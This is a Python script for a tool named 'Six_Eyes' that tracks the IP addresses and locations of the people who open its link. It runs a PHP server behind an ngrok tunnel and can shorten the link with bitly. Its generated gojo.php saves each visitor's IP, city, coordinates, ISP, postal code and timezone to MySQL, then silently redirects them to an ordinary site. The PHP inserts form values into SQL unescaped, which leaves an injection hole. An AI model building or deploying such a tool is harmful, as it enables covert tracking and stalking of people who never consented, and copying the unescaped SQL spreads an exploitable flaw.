import ngrok
import subprocess
import pymysql
import time
import pyshorteners

# Global defenitions
php_server_process = None
ngrok_url = None  


def start_ngrok(port_number, auth_token):

    """
    Start ngrok and return the ngrok URL.

    Parameters:
    - port_number (int): Port number for ngrok.
    - auth_token (str): Ngrok authentication token.

    Returns:
    - str: Ngrok URL.
    """
    
    try:
        global ngrok_url  

        listener = ngrok.forward(port_number, authtoken=auth_token)

        choice = input("Do you want to shorten the url?(Y/n): ")

        if choice.lower() == "y" or choice.lower() == "yes":
            type_bitly = pyshorteners.Shortener(api_key='your_bitly_api_key_goes_here')
            short_url = type_bitly.bitly.short(listener.url())
            print("\nShortened URL:", short_url)
            ngrok_url = short_url
        else:
            print("\nNgrok session established at:", listener.url())
            ngrok_url = listener.url()

        return ngrok_url

    except Exception as e:
        print(f"Error starting Ngrok: {e}")
        return None   
    
def start_php_server(port_number):

    """
    Start a PHP server on the specified port.

    Parameters:
    - port_number (int): Port number for the PHP server.
    """

    global php_server_process
    php_server_command = ["php", "-S", f"127.0.0.1:{port_number}"]
    php_server_process = subprocess.Popen(php_server_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    time.sleep(1)
    print(f"PHP server started on port {port_number}")
    time.sleep(1)

def start_mysql_server():

    """
    Start the MySQL server.
    """

    mysql_password = ''
    start_mysql_command = 'sudo systemctl start mysql'
    subprocess.run(start_mysql_command, shell=True)
    time.sleep(2)
    print("MySQL server started")

def stop_mysql_server():

    """
    Stop the MySQL server.
    """

    stop_mysql_command = 'sudo systemctl stop mysql'
    subprocess.run(stop_mysql_command, shell=True)

def create_mysql_database():

    """
    Create a MySQL database and table.
    """

    try:
        db_connection = pymysql.connect(host='127.0.0.1', user='root', password='', port=3306)
        cursor = db_connection.cursor()

        # Create a new database
        cursor.execute("CREATE DATABASE IF NOT EXISTS six_eyes;")
        cursor.execute("USE six_eyes;")

        # Create the "grabbed_ip" table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS grabbed_ip (
                id INT AUTO_INCREMENT PRIMARY KEY,
                ip VARCHAR(15) NOT NULL,
                city VARCHAR(255) NOT NULL,
                region VARCHAR(255) NOT NULL,
                country VARCHAR(255) NOT NULL,
                location VARCHAR(255) NOT NULL,
                isp VARCHAR(255) NOT NULL,
                pin_code VARCHAR(10) NOT NULL,
                timezone VARCHAR(255) NOT NULL
            );
        """)

        print("Database connected.")

    except pymysql.Error as e:
        print(f"Error: {e}")

    finally:
        # Close the database connection
        if 'db_connection' in locals() and db_connection:
            db_connection.close()


def view_database():

    """
    View the stored data from the database
    """

    try:
        # Check if service is running
        if not ngrok_url or not php_server_process or php_server_process.poll() is not None:
            print("\n\033[1;31;40mPlease start the service first!\033[0m")
            return

        db_connection = pymysql.connect(host='127.0.0.1', user='root', password='', port=3306, database='six_eyes')
        cursor = db_connection.cursor()

        # Fetch all records from the 'grabbed_ip' table
        cursor.execute("SELECT * FROM grabbed_ip")
        records = cursor.fetchall()

        # Print the records
        print("\nDatabase Records:\n")
        for record in records:
            print(record)

    except pymysql.Error as e:
        print(f"Error querying database: {e}")

    finally:
        # Close the database connection
        if 'db_connection' in locals() and db_connection:
            db_connection.close()



def generate_gojo_php(redirect_url):

    """
    Generate or update gojo.php with the specified content.

    Parameters:
    - redirect_url (str): The URL to which the form should redirect.
    """

    php_content = f"""<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    // Retrieve IP information from the form submission
    $ip = $_POST['ip'];
    $city = $_POST['city'];
    $region = $_POST['region'];
    $country = $_POST['country'];
    $location = $_POST['loc'];
    $organization = $_POST['org'];
    $postal = $_POST['postal'];
    $timezone = $_POST['timezone'];

    // Store the variables in the database
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "six_eyes";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {{
        die("Connection failed: " . $conn->connect_error);
    }}

    // Insert data into the 'grabbed_ip' table
    $sql = "INSERT INTO grabbed_ip (ip, city, region, country, location, isp, pin_code, timezone)
            VALUES ('$ip', '$city', '$region', '$country', '$location', '$organization', '$postal', '$timezone')";

    // Execute the SQL query
    $conn->query($sql);

    // Close the database connection
    $conn->close();

    // Specify the URL to which you want to redirect
    $redirect_url = '{redirect_url}';

    // Use the header function to send a raw HTTP header for the redirect
    header("Location: " . $redirect_url);

    // Ensure that the code below is not executed after the redirect
    exit();
}}
?>
"""

    # Write or overwrite the content to gojo.php
    with open("gojo.php", "w") as php_file:
        php_file.write(php_content)


if __name__ == "__main__":

    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡿⠁⣿⣿⣿⠋⣰⣿⡿⠁⣾⣿⣿⡿⠃⢸⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⣿⣿⣿⣿⣿⡿⢃⣿⣿⠃⢰⡿⢻⠁⢀⡿⠋⠀⡰⣿⣿⠟⠁⠀⣾⣿⠿⣟⣿⡿⠋⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣿⣿⣿⠟⡟⠁⢸⠏⡈⠀⠸⠁⠇⠀⠸⠀⠀⠐⣰⠟⠁⠀⠀⡸⠋⣰⣾⡿⠋⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⡇⠀⣿⠏⢡⠎⠀⢀⡆⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠘⠋⠁⠀⠀⣠⣿⢟⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢻⣻⠇⢇⢸⠃⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠊⣉⢴⣽⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⢿⠀⠀⠀⠀⠀⠀⢠⠂⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠔⠛⠉⠉⢉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠘⠀⠀⠀⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⠻⣟⢹⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⢠⢃⠀⠀⠀⠀⠀⠀⡀⠀⠀⣀⡠⠄⠀⠀⠀⠀⠀⠐⠊⠉⠙⠓⠛⣉⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠙⠣⠀⡀⠀⠀⠀⢸⠀⢸⠀⠀⠀⠀⢠⠊⢀⠋⣸⢠⠃⠀⢀⠔⠋⡠⣶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠓⢄⡀⢇⠀⠀⠀⠸⡀⠸⡀⠀⠀⠰⠁⡠⠃⣠⡷⠁⢀⢔⠁⢀⡔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠚⠉⠉⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⡿⢿⣈⣦⠀⠀⠘⣄⠀⠀⠀⢳⡀⠷⣀⣀⠿⠴⢥⣾⡯⠥⠤⠧⠤⠤⠮⠤⡤⢤⠤⡄⣀⣀⣴⡶⠂⠀⠀⠀⠀⣶⣶⣺⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣉⡁⠀⠀⠫⡦⣠⣀⡤⠟⠊⠹⠒⠊⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠓⠂⠀⠉⠣⣖⣦⣄⡀⠈⣡⣤⣤⣤⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⠃⠀⠀⠀⠀⣽⣿⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⣼⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣿⠛⠁⢀⣠⣤⡀⠀⠀⠀⠀⣤⣤⡶⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠤⢤⣼⣎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡼⠿⢿⣿⣿⣦⡀⠀⢼⠿⠃⣀⣤⠤⠄⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⡿⢾⡿⠊⣱⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣇⠀⠀⠉⠉⠙⠻⣏⣦⡀⣀⡘⠛⠂⠀⠀⠀⠀⠀⠀⣀⠴⠊⠉⠀⠀⢃⡞⢁⣴⡻⠬⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⡄⠀⠀⠀⠀⢠⣿⣍⣋⣉⡀⠀⠀⠀⠀⣀⡠⠴⠊⠁⠀⠀⠀⠀⠀⡸⠀⠘⡇⢱⠀⢀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⠀⠀⠀⢀⡸⠁⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣔⣁⠜⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣆⣀⡠⠚⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⠀⠀⠈⠳⣤⡄⠈⠁⠀⠀⠀⠀⢀⣀⣀⣰⣦⠀⠀⠀⠀⠀⠀⠀⣎⡞⠙⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢵⡀⠀⠀⠀⠀⠀⣠⡤⠔⠒⢉⣁⡀⠤⣤⣦⡇⠀⠀⠀⠀⠀⠀⠀⡿⠁⡀⢩⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠷⡄⠀⠀⢰⣮⣁⣴⡲⡽⣋⣀⣀⣿⣟⣛⠃⠀⠀⠀⠀⠀⠀⡠⢃⣴⠁⠸⣿⣿⣿⣿⣿⣽⣿⡿⠿⠽⠟⠛⠻⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠈⢢⡀⠀⠙⣶⠤⢽⡿⠛⠉⠉⢀⣀⠼⠲⡒⠒⠒⠂⢑⡎⠁⢸⠃⢀⣀⡹⠿⠛⠉⠉⠀⠀⠀⠀⠀⠀⡼⣸⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡇⠀⠀⡷⡄⠀⠈⢻⠻⢤⡴⣲⡚⠉⠀⠀⠀⠁⡀⣀⣰⠟⠀⣠⠗⠚⣉⣤⣶⣤⣴⣤⣴⣦⡥⠀⠀⠀⠁⡇⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠰⣿⣾⣧⣀⡠⠛⠁⠀⠈⢁⡤⣄⡶⢞⣿⠟⠉⣠⣔⣯⣵⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⣀⣾⣤⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⠃⠀⠀⢰⣿⣿⢋⡡⠀⠀⠀⣠⡴⢫⠟⣩⣶⣿⣥⣾⣟⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢻⠏⠀⠀⢛⡿⠋⠰⠋⠀⠀⢰⡿⠯⠤⠓⠛⠉⣿⠙⣆⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⠒⢿⢹⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠉⠃⠀⠂⠶⠋⠀⡰⢃⣴⠎⠀⠀⠀⠀⠀⠀⠀⣀⣽⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠘⣱⠟⠁⣠⠴⠂⠀⠶⠖⠚⠉⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣷⣶⣄⣀⣀⠀⠀⠙⠻")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⠀⠀⠀⠀⠀⠜⠁⢠⠆⢁⣤⠂⠀⠀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣬⣭⣴⣲")
    print("          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣧⠀⠀⠀⠠⠆⢀⢄⡤⠞⠛⠁⣀⢤⠞⠀⠰⠊⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⣿⡿⠛⣏⠄⠀⣀⣤⣴⣿⠀⠀⠀⠀⠀⠈⠈⠀⠀⡰⠛⠉⢀⡄⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    print("          ⣿⣿⣿⣿⣿⡟⢀⣶⣿⣿⡿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢠⢆⣈⢤⣠⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
    
    print("\n")
    
    
    while True:
        print("\nMenu:")
        print("1. Start service")
        print("2. View your database")
        print("3. Exit")
        print("\n")

        choice = input("Enter your choice (1/2/3): ")

        if choice == "1":
    	    if ngrok_url == None:
    	        # Replace "your_ngrok_auth_token_goes_here" with your actual ngrok authentication token
    	        ngrok_auth_token = "your_ngrok_auth_token_goes_here"
    	        
    	        # Get user input for the ngrok port number
    	        port_number = input("\nEnter the port number for running the service: ")
    	        
                #Validate port number
    	        try:
    	            port_number = int(port_number)
    	            if port_number < 1:
    	                port_number = 4444
    	        except ValueError:
    	            print("Invalid input. Using default port number 4444.")
    	            port_number = 4444
    	            
    	        # Start MySQL server
    	        print("\nStarting MySQL Server with privileged access....")
    	        time.sleep(1)
    	        start_mysql_server()
    	        time.sleep(1)
    	        
    	        # Optionally, check the status of the MySQL server after starting it
    	        status_mysql_command = 'sudo systemctl status mysql'
    	        status_result = subprocess.run(status_mysql_command, shell=True, capture_output=True, text=True)
    	        
    	        # Print the status result
    	        # print("\n",status_result.stdout)
    	        
    	        # Wait for MySQL server to start
    	        while "Active: inactive" in status_result.stdout:
    	            print("Waiting for MySQL server to start...")
    	            time.sleep(1)
    	            status_result = subprocess.run(status_mysql_command, shell=True, capture_output=True, text=True)
    	        
    	        # Connect MySQL database
    	        print("Connecting to database....")
    	        time.sleep(1)
    	        create_mysql_database()
    	        time.sleep(1)
    	        
    	        # Start PHP server
    	        print("\nStarting PHP Server....")
    	        time.sleep(2)
    	        start_php_server(port_number)
    	        
    	        # Get user input for the redirect URL
    	        redirect_url = input("\nEnter the URL for redirection (Full URL. Ex: https://www.google.com): ")
    	        
    	        # Generate or update gojo.php
    	        generate_gojo_php(redirect_url)
    	        
    	        # Start ngrok
    	        print("\nStarting Ngrok....")
    	        time.sleep(2)
    	        ngrok_url = start_ngrok(port_number, ngrok_auth_token)
    	    else:
    	        print("\n\033[1;31;40mService already running\033[0m")


        elif choice == "2":
            view_database()

        elif choice == "3":
            stop_mysql_server()

            if php_server_process:
                php_server_process.terminate()

            ngrok.disconnect()
            print("\n\033[1;31;40mThank you for using Six_Eyes. Adiós!\033[0m")
            break

        else:
            print("\nInvalid choice. Please enter 1, 2, or 3.")

